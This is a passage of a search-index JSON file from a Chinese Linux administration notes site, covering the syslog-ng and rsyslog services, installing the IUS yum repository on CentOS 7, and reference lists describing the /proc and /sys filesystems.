ng\u5185\u5e55\u535a\u5ba2 http://insider.blogs.balabit.com syslog-ng Open Source Edition 02/26/2014 SYSLOG-NG.CONF(5)","title":"\u7cfb\u7edf\u65e5\u5fd7 syslog-ng \u670d\u52a1"},{"location":"system/centos7/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%972/","text":"\u7cfb\u7edf\u65e5\u5fd7 rsyslog \u670d\u52a1 rsyslog\uff1a Rsyslog - \u7ef4\u57fa\u767e\u79d1 (wikipedia.org) \u9879\u76ee\u59cb\u4e8e 2004 \u5e74 [root@VM-0-16-centos ~]# rpm -ql rsyslog /etc/logrotate.d/syslog /etc/pki/rsyslog /etc/rsyslog.conf /etc/rsyslog.d /etc/sysconfig/rsyslog /usr/bin/rsyslog-recover-qi.pl /usr/lib/systemd/system/rsyslog.service /usr/lib64/rsyslog /usr/lib64/rsyslog/imdiag.so /usr/lib64/rsyslog/imfile.so /usr/lib64/rsyslog/imjournal.so /usr/lib64/rsyslog/imklog.so /usr/lib64/rsyslog/immark.so /usr/lib64/rsyslog/impstats.so /usr/lib64/rsyslog/imptcp.so /usr/lib64/rsyslog/imtcp.so /usr/lib64/rsyslog/imudp.so /usr/lib64/rsyslog/imuxsock.so /usr/lib64/rsyslog/lmnet.so /usr/lib64/rsyslog/lmnetstrms.so /usr/lib64/rsyslog/lmnsd_ptcp.so /usr/lib64/rsyslog/lmregexp.so /usr/lib64/rsyslog/lmstrmsrv.so /usr/lib64/rsyslog/lmtcpclt.so /usr/lib64/rsyslog/lmtcpsrv.so /usr/lib64/rsyslog/lmzlibw.so /usr/lib64/rsyslog/mmanon.so /usr/lib64/rsyslog/mmcount.so /usr/lib64/rsyslog/mmexternal.so /usr/lib64/rsyslog/mmutf8fix.so /usr/lib64/rsyslog/omjournal.so /usr/lib64/rsyslog/ommail.so /usr/lib64/rsyslog/omprog.so /usr/lib64/rsyslog/omruleset.so /usr/lib64/rsyslog/omstdout.so /usr/lib64/rsyslog/omtesting.so /usr/lib64/rsyslog/omuxsock.so /usr/lib64/rsyslog/pmaixforwardedfrom.so /usr/lib64/rsyslog/pmcisconames.so /usr/lib64/rsyslog/pmlastmsg.so /usr/lib64/rsyslog/pmrfc3164sd.so /usr/lib64/rsyslog/pmsnare.so /usr/sbin/rsyslogd /usr/share/doc/rsyslog-8.24.0 /usr/share/doc/rsyslog-8.24.0/AUTHORS /usr/share/doc/rsyslog-8.24.0/COPYING /usr/share/doc/rsyslog-8.24.0/COPYING.ASL20 /usr/share/doc/rsyslog-8.24.0/COPYING.LESSER /usr/share/doc/rsyslog-8.24.0/ChangeLog /usr/share/man/man5/rsyslog.conf.5.gz /usr/share/man/man8/rsyslogd.8.gz /var/lib/rsyslog","title":"\u7cfb\u7edf\u65e5\u5fd7rsyslog\u670d\u52a1"},{"location":"system/centos7/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%972/#rsyslog","text":"rsyslog\uff1a Rsyslog - \u7ef4\u57fa\u767e\u79d1 (wikipedia.org) \u9879\u76ee\u59cb\u4e8e 2004 \u5e74 [root@VM-0-16-centos ~]# rpm -ql rsyslog /etc/logrotate.d/syslog /etc/pki/rsyslog /etc/rsyslog.conf /etc/rsyslog.d /etc/sysconfig/rsyslog /usr/bin/rsyslog-recover-qi.pl /usr/lib/systemd/system/rsyslog.service /usr/lib64/rsyslog /usr/lib64/rsyslog/imdiag.so /usr/lib64/rsyslog/imfile.so /usr/lib64/rsyslog/imjournal.so /usr/lib64/rsyslog/imklog.so /usr/lib64/rsyslog/immark.so /usr/lib64/rsyslog/impstats.so /usr/lib64/rsyslog/imptcp.so /usr/lib64/rsyslog/imtcp.so /usr/lib64/rsyslog/imudp.so /usr/lib64/rsyslog/imuxsock.so /usr/lib64/rsyslog/lmnet.so /usr/lib64/rsyslog/lmnetstrms.so /usr/lib64/rsyslog/lmnsd_ptcp.so /usr/lib64/rsyslog/lmregexp.so /usr/lib64/rsyslog/lmstrmsrv.so /usr/lib64/rsyslog/lmtcpclt.so /usr/lib64/rsyslog/lmtcpsrv.so /usr/lib64/rsyslog/lmzlibw.so /usr/lib64/rsyslog/mmanon.so /usr/lib64/rsyslog/mmcount.so /usr/lib64/rsyslog/mmexternal.so /usr/lib64/rsyslog/mmutf8fix.so /usr/lib64/rsyslog/omjournal.so /usr/lib64/rsyslog/ommail.so /usr/lib64/rsyslog/omprog.so /usr/lib64/rsyslog/omruleset.so /usr/lib64/rsyslog/omstdout.so /usr/lib64/rsyslog/omtesting.so /usr/lib64/rsyslog/omuxsock.so /usr/lib64/rsyslog/pmaixforwardedfrom.so /usr/lib64/rsyslog/pmcisconames.so /usr/lib64/rsyslog/pmlastmsg.so /usr/lib64/rsyslog/pmrfc3164sd.so /usr/lib64/rsyslog/pmsnare.so /usr/sbin/rsyslogd /usr/share/doc/rsyslog-8.24.0 /usr/share/doc/rsyslog-8.24.0/AUTHORS /usr/share/doc/rsyslog-8.24.0/COPYING /usr/share/doc/rsyslog-8.24.0/COPYING.ASL20 /usr/share/doc/rsyslog-8.24.0/COPYING.LESSER /usr/share/doc/rsyslog-8.24.0/ChangeLog /usr/share/man/man5/rsyslog.conf.5.gz /usr/share/man/man8/rsyslogd.8.gz /var/lib/rsyslog","title":"\u7cfb\u7edf\u65e5\u5fd7 rsyslog \u670d\u52a1"},{"location":"system/centos7/yum/ius/","text":"IUS\u6e90 IUS \u662f\u4e00\u4e2a yum \u5b58\u50a8\u5e93\uff0c\u53ef\u4e3a RHEL \u548c CentOS \u63d0\u4f9b\u8f83\u65b0\u7248\u672c\u7684\u7cbe\u9009\u8f6f\u4ef6\u3002 \u5b89\u88c5 RHEL/CentOS 7 yum install \\ https://repo.ius.io/ius-release-el7.rpm \\ https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm \u5b98\u7f51\u5730\u5740\uff1a https://ius.io/","title":"ius\u6e90"},{"location":"system/centos7/yum/ius/#ius","text":"IUS \u662f\u4e00\u4e2a yum \u5b58\u50a8\u5e93\uff0c\u53ef\u4e3a RHEL \u548c CentOS \u63d0\u4f9b\u8f83\u65b0\u7248\u672c\u7684\u7cbe\u9009\u8f6f\u4ef6\u3002 \u5b89\u88c5","title":"IUS\u6e90"},{"location":"system/centos7/yum/ius/#rhelcentos-7","text":"yum install \\ https://repo.ius.io/ius-release-el7.rpm \\ https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm \u5b98\u7f51\u5730\u5740\uff1a https://ius.io/","title":"RHEL/CentOS 7"},{"location":"system/linux/IO/0proc%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","text":"/proc \u6587\u4ef6\u7cfb\u7edf /proc/cmdline \u542f\u52a8\u65f6\u4f20\u9012\u7ed9kernel\u7684\u53c2\u6570\u4fe1\u606f\uff08\u5c31\u662fbootargs\u4fe1\u606f\uff09 /proc/cpuinfo cpu\u7684\u4fe1\u606f /proc/crypto \u5185\u6838\u4f7f\u7528\u7684\u6240\u6709\u5df2\u5b89\u88c5\u7684\u52a0\u5bc6\u5bc6\u7801\u53ca\u7ec6\u8282 /proc/devices \u5df2\u7ecf\u52a0\u8f7d\u7684\u8bbe\u5907\u5e76\u5206\u7c7b /proc/dma \u5df2\u6ce8\u518c\u4f7f\u7528\u7684ISA DMA\u9891\u9053\u5217\u8868 /proc/execdomains Linux \u5185\u6838\u5f53\u524d\u652f\u6301\u7684execution domains /proc/fb \u5e27\u7f13\u51b2\u8bbe\u5907\u5217\u8868\uff0c\u5305\u62ec\u6570\u91cf\u548c\u63a7\u5236\u5b83\u7684\u9a71\u52a8 /proc/filesystems \u5185\u6838\u5f53\u524d\u652f\u6301\u7684\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b /proc/interrupts x86\u67b6\u6784\u4e2d\u7684\u6bcf\u4e2aIRQ\u4e2d\u65ad\u6570 /proc/iomem \u6bcf\u4e2a\u7269\u7406\u8bbe\u5907\u5f53\u524d\u5728\u7cfb\u7edf\u5185\u5b58\u4e2d\u7684\u6620\u5c04 /proc/ioports \u4e00\u4e2a\u8bbe\u5907\u7684\u8f93\u5165\u8f93\u51fa\u6240\u4f7f\u7528\u7684\u6ce8\u518c\u7aef\u53e3\u8303\u56f4 /proc/kcore \u4ee3\u8868\u7cfb\u7edf\u7684\u7269\u7406\u5185\u5b58\uff0c\u5b58\u50a8\u4e3a\u6838\u5fc3\u6587\u4ef6\u683c\u5f0f\uff0c\u91cc\u8fb9\u663e\u793a\u7684\u662f\u5b57\u8282\u6570\uff0c\u7b49\u4e8eRAM\u5927\u5c0f\u52a0\u4e0a4kb /proc/kmsg \u8bb0\u5f55\u5185\u6838\u751f\u6210\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7/sbin/klogd\u6216/bin/dmesg\u6765\u5904\u7406 /proc/loadavg \u6839\u636e\u8fc7\u53bb\u4e00\u6bb5\u65f6\u95f4\u5185CPU\u548cIO\u7684\u72b6\u6001\u5f97\u51fa\u7684\u8d1f\u8f7d\u72b6\u6001\uff0c\u4e0euptime\u547d\u4ee4\u6709\u5173 /proc/locks \u5185\u6838\u9501\u4f4f\u7684\u6587\u4ef6\u5217\u8868 /proc/mdstat \u591a\u786c\u76d8\uff0cRAID\u914d\u7f6e\u4fe1\u606f(md=multiple disks) /proc/meminfo RAM\u4f7f\u7528\u7684\u76f8\u5173\u4fe1\u606f /proc/misc \u5176\u4ed6\u7684\u4e3b\u8981\u8bbe\u5907(\u8bbe\u5907\u53f7\u4e3a10)\u4e0a\u6ce8\u518c\u7684\u9a71\u52a8 /proc/modules \u6240\u6709\u52a0\u8f7d\u5230\u5185\u6838\u7684\u6a21\u5757\u5217\u8868 /proc/mounts \u7cfb\u7edf\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u6302\u8f7d /proc/partitions \u5206\u533a\u4e2d\u7684\u5757\u5206\u914d\u4fe1\u606f /proc/pci \u7cfb\u7edf\u4e2d\u7684PCI\u8bbe\u5907\u5217\u8868 /proc/slabinfo \u7cfb\u7edf\u4e2d\u6240\u6709\u6d3b\u52a8\u7684 slab \u7f13\u5b58\u4fe1\u606f /proc/stat \u6240\u6709\u7684CPU\u6d3b\u52a8\u4fe1\u606f /proc/uptime \u7cfb\u7edf\u5df2\u7ecf\u8fd0\u884c\u4e86\u591a\u4e45 /proc/swaps \u4ea4\u6362\u7a7a\u95f4\u7684\u4f7f\u7528\u60c5\u51b5 /proc/version Linux\u5185\u6838\u7248\u672c\u548cgcc\u7248\u672c /proc/bus \u7cfb\u7edf\u603b\u7ebf(Bus)\u4fe1\u606f\uff0c\u4f8b\u5982pci/usb\u7b49 /proc/driver \u9a71\u52a8\u4fe1\u606f /proc/fs \u6587\u4ef6\u7cfb\u7edf\u4fe1\u606f /proc/ide ide\u8bbe\u5907\u4fe1\u606f /proc/irq \u4e2d\u65ad\u8bf7\u6c42\u8bbe\u5907\u4fe1\u606f /proc/net \u7f51\u5361\u8bbe\u5907\u4fe1\u606f /proc/scsi scsi\u8bbe\u5907\u4fe1\u606f /proc/tty tty\u8bbe\u5907\u4fe1\u606f /proc/net/dev \u663e\u793a\u7f51\u7edc\u9002\u914d\u5668\u53ca\u7edf\u8ba1\u4fe1\u606f /proc/vmstat \u865a\u62df\u5185\u5b58\u7edf\u8ba1\u4fe1\u606f /proc/vmcore \u5185\u6838panic\u65f6\u7684\u5185\u5b58\u6620\u50cf /proc/diskstats \u53d6\u5f97\u78c1\u76d8\u4fe1\u606f /proc/schedstat kernel\u8c03\u5ea6\u5668\u7684\u7edf\u8ba1\u4fe1\u606f /proc/zoneinfo \u663e\u793a\u5185\u5b58\u7a7a\u95f4\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u5bf9\u5206\u6790\u865a\u62df\u5185\u5b58\u884c\u4e3a\u5f88\u6709\u7528 /proc\u76ee\u5f55\u4e2d\u8fdb\u7a0bN\u7684\u4fe1\u606f /proc/N/cmdline \u8fdb\u7a0b\u542f\u52a8\u547d\u4ee4 /proc/N/cwd \u94fe\u63a5\u5230\u8fdb\u7a0b\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55 /proc/N/environ \u8fdb\u7a0b\u73af\u5883\u53d8\u91cf\u5217\u8868 /proc/N/exe \u94fe\u63a5\u5230\u8fdb\u7a0b\u7684\u6267\u884c\u547d\u4ee4\u6587\u4ef6 /proc/N/fd \u5305\u542b\u8fdb\u7a0b\u76f8\u5173\u7684\u6240\u6709\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26 \uff08ls /proc/ /fd | wc -l \u67e5\u770b\u67d0\u4e2a\u8fdb\u7a0b\u6253\u5f00\u591a\u5c11FD\uff09 /proc/N/maps \u4e0e\u8fdb\u7a0b\u76f8\u5173\u7684\u5185\u5b58\u6620\u5c04\u4fe1\u606f /proc/N/mem \u6307\u4ee3\u8fdb\u7a0b\u6301\u6709\u7684\u5185\u5b58\uff0c\u4e0d\u53ef\u8bfb /proc/N/root \u94fe\u63a5\u5230\u8fdb\u7a0b\u7684\u6839\u76ee\u5f55 /proc/N/stat \u8fdb\u7a0b\u7684\u72b6\u6001 /proc/N/statm \u8fdb\u7a0b\u4f7f\u7528\u7684\u5185\u5b58\u7684\u72b6\u6001 /proc/N/status \u8fdb\u7a0b\u72b6\u6001\u4fe1\u606f\uff0c\u6bd4stat/statm\u66f4\u5177\u53ef\u8bfb\u6027 /proc/self \u94fe\u63a5\u5230\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b","title":"proc\u6587\u4ef6\u7cfb\u7edf"},{"location":"system/linux/IO/0proc%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#proc","text":"/proc/cmdline \u542f\u52a8\u65f6\u4f20\u9012\u7ed9kernel\u7684\u53c2\u6570\u4fe1\u606f\uff08\u5c31\u662fbootargs\u4fe1\u606f\uff09 /proc/cpuinfo cpu\u7684\u4fe1\u606f /proc/crypto \u5185\u6838\u4f7f\u7528\u7684\u6240\u6709\u5df2\u5b89\u88c5\u7684\u52a0\u5bc6\u5bc6\u7801\u53ca\u7ec6\u8282 /proc/devices \u5df2\u7ecf\u52a0\u8f7d\u7684\u8bbe\u5907\u5e76\u5206\u7c7b /proc/dma \u5df2\u6ce8\u518c\u4f7f\u7528\u7684ISA DMA\u9891\u9053\u5217\u8868 /proc/execdomains Linux \u5185\u6838\u5f53\u524d\u652f\u6301\u7684execution domains /proc/fb \u5e27\u7f13\u51b2\u8bbe\u5907\u5217\u8868\uff0c\u5305\u62ec\u6570\u91cf\u548c\u63a7\u5236\u5b83\u7684\u9a71\u52a8 /proc/filesystems \u5185\u6838\u5f53\u524d\u652f\u6301\u7684\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b /proc/interrupts x86\u67b6\u6784\u4e2d\u7684\u6bcf\u4e2aIRQ\u4e2d\u65ad\u6570 /proc/iomem \u6bcf\u4e2a\u7269\u7406\u8bbe\u5907\u5f53\u524d\u5728\u7cfb\u7edf\u5185\u5b58\u4e2d\u7684\u6620\u5c04 /proc/ioports \u4e00\u4e2a\u8bbe\u5907\u7684\u8f93\u5165\u8f93\u51fa\u6240\u4f7f\u7528\u7684\u6ce8\u518c\u7aef\u53e3\u8303\u56f4 /proc/kcore \u4ee3\u8868\u7cfb\u7edf\u7684\u7269\u7406\u5185\u5b58\uff0c\u5b58\u50a8\u4e3a\u6838\u5fc3\u6587\u4ef6\u683c\u5f0f\uff0c\u91cc\u8fb9\u663e\u793a\u7684\u662f\u5b57\u8282\u6570\uff0c\u7b49\u4e8eRAM\u5927\u5c0f\u52a0\u4e0a4kb /proc/kmsg \u8bb0\u5f55\u5185\u6838\u751f\u6210\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7/sbin/klogd\u6216/bin/dmesg\u6765\u5904\u7406 /proc/loadavg \u6839\u636e\u8fc7\u53bb\u4e00\u6bb5\u65f6\u95f4\u5185CPU\u548cIO\u7684\u72b6\u6001\u5f97\u51fa\u7684\u8d1f\u8f7d\u72b6\u6001\uff0c\u4e0euptime\u547d\u4ee4\u6709\u5173 /proc/locks \u5185\u6838\u9501\u4f4f\u7684\u6587\u4ef6\u5217\u8868 /proc/mdstat \u591a\u786c\u76d8\uff0cRAID\u914d\u7f6e\u4fe1\u606f(md=multiple disks) /proc/meminfo RAM\u4f7f\u7528\u7684\u76f8\u5173\u4fe1\u606f /proc/misc \u5176\u4ed6\u7684\u4e3b\u8981\u8bbe\u5907(\u8bbe\u5907\u53f7\u4e3a10)\u4e0a\u6ce8\u518c\u7684\u9a71\u52a8 /proc/modules \u6240\u6709\u52a0\u8f7d\u5230\u5185\u6838\u7684\u6a21\u5757\u5217\u8868 /proc/mounts \u7cfb\u7edf\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u6302\u8f7d /proc/partitions \u5206\u533a\u4e2d\u7684\u5757\u5206\u914d\u4fe1\u606f /proc/pci \u7cfb\u7edf\u4e2d\u7684PCI\u8bbe\u5907\u5217\u8868 /proc/slabinfo \u7cfb\u7edf\u4e2d\u6240\u6709\u6d3b\u52a8\u7684 slab \u7f13\u5b58\u4fe1\u606f /proc/stat \u6240\u6709\u7684CPU\u6d3b\u52a8\u4fe1\u606f /proc/uptime \u7cfb\u7edf\u5df2\u7ecf\u8fd0\u884c\u4e86\u591a\u4e45 /proc/swaps \u4ea4\u6362\u7a7a\u95f4\u7684\u4f7f\u7528\u60c5\u51b5 /proc/version Linux\u5185\u6838\u7248\u672c\u548cgcc\u7248\u672c /proc/bus \u7cfb\u7edf\u603b\u7ebf(Bus)\u4fe1\u606f\uff0c\u4f8b\u5982pci/usb\u7b49 /proc/driver \u9a71\u52a8\u4fe1\u606f /proc/fs \u6587\u4ef6\u7cfb\u7edf\u4fe1\u606f /proc/ide ide\u8bbe\u5907\u4fe1\u606f /proc/irq \u4e2d\u65ad\u8bf7\u6c42\u8bbe\u5907\u4fe1\u606f /proc/net \u7f51\u5361\u8bbe\u5907\u4fe1\u606f /proc/scsi scsi\u8bbe\u5907\u4fe1\u606f /proc/tty tty\u8bbe\u5907\u4fe1\u606f /proc/net/dev \u663e\u793a\u7f51\u7edc\u9002\u914d\u5668\u53ca\u7edf\u8ba1\u4fe1\u606f /proc/vmstat \u865a\u62df\u5185\u5b58\u7edf\u8ba1\u4fe1\u606f /proc/vmcore \u5185\u6838panic\u65f6\u7684\u5185\u5b58\u6620\u50cf /proc/diskstats \u53d6\u5f97\u78c1\u76d8\u4fe1\u606f /proc/schedstat kernel\u8c03\u5ea6\u5668\u7684\u7edf\u8ba1\u4fe1\u606f /proc/zoneinfo \u663e\u793a\u5185\u5b58\u7a7a\u95f4\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u5bf9\u5206\u6790\u865a\u62df\u5185\u5b58\u884c\u4e3a\u5f88\u6709\u7528","title":"/proc \u6587\u4ef6\u7cfb\u7edf"},{"location":"system/linux/IO/0proc%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#procn","text":"/proc/N/cmdline \u8fdb\u7a0b\u542f\u52a8\u547d\u4ee4 /proc/N/cwd \u94fe\u63a5\u5230\u8fdb\u7a0b\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55 /proc/N/environ \u8fdb\u7a0b\u73af\u5883\u53d8\u91cf\u5217\u8868 /proc/N/exe \u94fe\u63a5\u5230\u8fdb\u7a0b\u7684\u6267\u884c\u547d\u4ee4\u6587\u4ef6 /proc/N/fd \u5305\u542b\u8fdb\u7a0b\u76f8\u5173\u7684\u6240\u6709\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26 \uff08ls /proc/ /fd | wc -l \u67e5\u770b\u67d0\u4e2a\u8fdb\u7a0b\u6253\u5f00\u591a\u5c11FD\uff09 /proc/N/maps \u4e0e\u8fdb\u7a0b\u76f8\u5173\u7684\u5185\u5b58\u6620\u5c04\u4fe1\u606f /proc/N/mem \u6307\u4ee3\u8fdb\u7a0b\u6301\u6709\u7684\u5185\u5b58\uff0c\u4e0d\u53ef\u8bfb /proc/N/root \u94fe\u63a5\u5230\u8fdb\u7a0b\u7684\u6839\u76ee\u5f55 /proc/N/stat \u8fdb\u7a0b\u7684\u72b6\u6001 /proc/N/statm \u8fdb\u7a0b\u4f7f\u7528\u7684\u5185\u5b58\u7684\u72b6\u6001 /proc/N/status \u8fdb\u7a0b\u72b6\u6001\u4fe1\u606f\uff0c\u6bd4stat/statm\u66f4\u5177\u53ef\u8bfb\u6027 /proc/self \u94fe\u63a5\u5230\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b","title":"/proc\u76ee\u5f55\u4e2d\u8fdb\u7a0bN\u7684\u4fe1\u606f"},{"location":"system/linux/IO/0sys%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","text":"/sys \u6587\u4ef6\u7cfb\u7edf /sys/devices \uff08/sys\u6587\u4ef6\u7cfb\u7edf\u6700\u91cd\u8981\u7684\u76ee\u5f55\u7ed3\u6784\uff09\u8be5\u76ee\u5f55\u4e0b\u662f\u5168\u5c40\u8bbe\u5907\u7ed3\u6784\u4f53\u7cfb\uff0c\u5305\u542b\u6240\u6709\u88ab\u53d1\u73b0\u7684\u6ce8\u518c\u5728\u5404\u79cd\u603b\u7ebf\u4e0a\u7684\u5404\u79cd\u7269\u7406\u8bbe\u5907\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6240\u6709\u7684\u7269\u7406\u8bbe\u5907\u90fd\u6309\u5176\u5728\u603b\u7ebf\u4e0a\u7684\u62d3\u6251\u7ed3\u6784\u6765\u663e\u793a\uff0c\u4f46\u6709\u4e24\u4e2a\u4f8b\u5916\uff0c\u5373platform devices\u548csystem devices\u3002platform devices\u4e00\u822c\u662f\u6302\u5728\u82af\u7247\u5185\u90e8\u7684\u9ad8\u901f\u6216\u8005\u4f4e\u901f\u603b\u7ebf\u4e0a\u7684\u5404\u79cd\u63a7\u5236\u5668\u548c\u5916\u8bbe\uff0c\u5b83\u4eec\u80fd\u88abCPU\u76f4\u63a5\u5bfb\u5740\uff1bsystem devices\u4e0d\u662f\u5916\u8bbe\uff0c\u800c\u662f\u82af\u7247\u5185\u90e8\u7684\u6838\u5fc3\u7ed3\u6784\uff0c\u6bd4\u5982CPU\uff0ctimer\u7b49\uff0c\u5b83\u4eec\u4e00\u822c\u6ca1\u6709\u76f8\u5173\u7684\u9a71\u52a8\uff0c\u4f46\u662f\u4f1a\u6709\u4e00\u4e9b\u4f53\u7cfb\u7ed3\u6784\u76f8\u5173\u7684\u4ee3\u7801\u6765\u914d\u7f6e\u5b83\u4eec\u3002 /sys/dev \u8be5\u76ee\u5f55\u4e0b\u6709\u5b57\u7b26\u8bbe\u5907(block)\u548c\u5757\u8bbe\u5907(char)\u4e24\u4e2a\u5b50\u76ee\u5f55\uff0c\u91cc\u9762\u5168\u662f\u4ee5\u4e3b\u6b21\u8bbe\u5907\u53f7(major:minor)\u547d\u540d\u7684\u94fe\u63a5\u6587\u4ef6\uff0c\u94fe\u63a5\u5230/sys/devices\u3002 /sys/class \uff08\u6309\u529f\u80fd\u5206\u7c7b\u8bbe\u5907\uff09\u8be5\u76ee\u5f55\u4e0b\u5305\u542b\u6240\u6709\u6ce8\u518c\u5728kernel\u91cc\u9762\u7684\u8bbe\u5907\u7c7b\u578b\uff0c\u6bcf\u4e2a\u8bbe\u5907\u7c7b\u578b\u8868\u8fbe\u5177\u6709\u4e00\u79cd\u529f\u80fd\u7684\u8bbe\u5907\u3002\u6bcf\u4e2a\u8bbe\u5907\u7c7b\u578b\u5b50\u76ee\u5f55\u4e0b\u662f\u5177\u4f53\u8bbe\u5907\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u8fd9\u4e9b\u94fe\u63a5\u6307\u5411/sys/devices/...\u4e0b\u7684\u5177\u4f53\u8bbe\u5907\u3002\u8bbe\u5907\u7c7b\u578b\u548c\u8bbe\u5907\u5e76\u6ca1\u6709\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb\uff0c\u4e00\u4e2a\u7269\u7406\u8bbe\u5907\u53ef\u80fd\u5177\u5907\u591a\u79cd\u8bbe\u5907\u7c7b\u578b\uff1b\u4e00\u4e2a\u8bbe\u5907\u7c7b\u578b\u53ea\u8868\u8fbe\u5177\u6709\u4e00\u79cd\u529f\u80fd\u7684\u8bbe\u5907\uff0c\u6bd4\u5982\uff1a\u7cfb\u7edf\u6240\u6709\u8f93\u5165\u8bbe\u5907\u90fd\u4f1a\u51fa\u73b0\u5728/sys/class/input\u4e4b\u4e0b\uff0c\u800c\u4e0d\u8bba\u5b83\u4eec\u662f\u4ee5\u4f55\u79cd\u603b\u7ebf\u8fde\u63a5\u5230\u7cfb\u7edf\u7684\u3002(/sys/class\u4e5f\u662f\u6784\u6210linux\u7edf\u4e00\u8bbe\u5907\u6a21\u578b\u7684\u4e00\u90e8\u5206) /sys/block \uff08\u4ecelinux2.6.26\u7248\u672c\u5f00\u59cb\u5df2\u7ecf\u79fb\u5230\u4e86/sys/class/block\uff09 \u4ee3\u8868\u7740\u7cfb\u7edf\u4e2d\u5f53\u524d\u88ab\u53d1\u73b0\u7684\u6240\u6709\u5757\u8bbe\u5907\u3002\u6309\u7167\u529f\u80fd\u6765\u8bf4\u9632\u6b62\u5728/sys/class\u4e0b\u4f1a\u66f4\u5408\u9002\uff0c\u4f46\u7531\u4e8e\u5386\u53f2\u9057\u7559\u56e0\u7d20\u800c\u4e00\u76f4\u5b58\u5728\u4e8e/sys/block\uff0c\u4f46\u4ecelinux2.6.22\u5185\u6838\u5f00\u59cb\u8fd9\u90e8\u5206\u5c31\u5df2\u7ecf\u6807\u8bb0\u4e3a\u8fc7\u53bb\u65f6\uff0c\u53ea\u6709\u6253\u5f00\u4e86CONFIG_SYSFS_DEPRECATED\u914d\u7f6e\u7f16\u8bd1\u624d\u4f1a\u6709\u8fd9\u4e2a\u76ee\u5f55\u5b58\u5728\uff0c\u5e76\u4e14\u5176\u4e2d\u7684\u5185\u5bb9\u5728\u4ecelinux2.6.26\u7248\u672c\u5f00\u59cb\u5df2\u7ecf\u6b63\u5f0f\u79fb\u5230\u4e86/sys/class/block\uff0c\u65e7\u7684\u63a5\u53e3/sys/block\u4e3a\u4e86\u5411\u540e\u517c\u5bb9\u800c\u4fdd\u7559\u5b58\u5728\uff0c\u4f46\u5176\u4e2d\u7684\u5185\u5bb9\u5df2\u7ecf\u53d8\u4e3a\u4e86\u6307\u5411\u5b83\u4eec\u5728/sys/devices/\u4e2d\u771f\u5b9e\u8bbe\u5907\u7684\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\u3002 /sys/bus \uff08\u6309\u603b\u7ebf\u7c7b\u578b\u5206\u7c7b\u8bbe\u5907\uff09\u4e00\u822c\u6765\u8bf4\u6bcf\u4e2a\u5b50\u76ee\u5f55(\u603b\u7ebf\u7c7b\u578b)\u4e0b\u5305\u542b\u4e24\u4e2a\u5b50\u76ee\u5f55\uff0c\u4e00\u4e2a\u662fdevices\uff0c\u53e6\u4e00\u4e2a\u662fdrivers\uff1b\u5176\u4e2ddevices\u4e0b\u662f\u8fd9\u4e2a\u603b\u7ebf\u7c7b\u578b\u4e0b\u7684\u6240\u6709\u8bbe\u5907\uff0c\u8fd9\u4e9b\u8bbe\u5907\u90fd\u662f\u7b26\u53f7\u94fe\u63a5\uff0c\u5b83\u4eec\u5206\u522b\u6307\u5411\u771f\u6b63\u7684\u8bbe\u5907(/sys/devices/...\u4e0b)\uff1b\u800cdrivers\u4e0b\u662f\u6240\u6709\u6ce8\u518c\u5728\u8fd9\u4e2a\u603b\u7ebf\u4e0a\u7684\u9a71\u52a8\uff0c\u6bcf\u4e2adriver\u5b50\u76ee\u5f55\u4e0b \u662f\u4e00\u4e9b\u53ef\u4ee5\u89c2\u5bdf\u548c\u4fee\u6539\u7684driver\u53c2\u6570\u3002 (\u5b83\u4e5f\u662f\u6784\u6210linux\u7edf\u4e00\u8bbe\u5907\u6a21\u578b\u7684\u4e00\u90e8\u5206) /sys/module \u8be5\u76ee\u5f55\u5305\u542b\u6240\u6709\u88ab\u8f7d\u5165Kernel\u7684\u6a21\u5757\uff0c\u65e0\u8bba\u8fd9\u4e9b\u6a21\u5757\u662f\u4ee5\u5185\u8054(inlined)\u65b9\u5f0f\u7f16\u8bd1\u5230\u5185\u6838\u6620\u50cf\u6587\u4ef6\u4e2d\u8fd8\u662f\u7f16\u8bd1\u4e3a\u5916\u6a21\u5757(.ko\u6587\u4ef6) /sys/fs \u8be5\u76ee\u5f55\u7528\u6765\u63cf\u8ff0\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u5305\u62ec\u6587\u4ef6\u7cfb\u7edf\u672c\u8eab\u548c\u6309\u7167\u6587\u4ef6\u7cfb\u7edf\u5206\u7c7b\u5b58\u653e\u7684\u5df2\u6302\u8f7d\u70b9\u3002 /sys/kernel \u8be5\u76ee\u5f55\u4e0b\u5b58\u653e\u7684\u662f\u5185\u6838\u4e2d\u6240\u6709\u53ef\u8c03\u6574\u7684\u53c2\u6570 /sys/firmware \u8be5\u76ee\u5f55\u4e0b\u5305\u542b\u5bf9\u56fa\u4ef6\u5bf9\u8c61(firmware 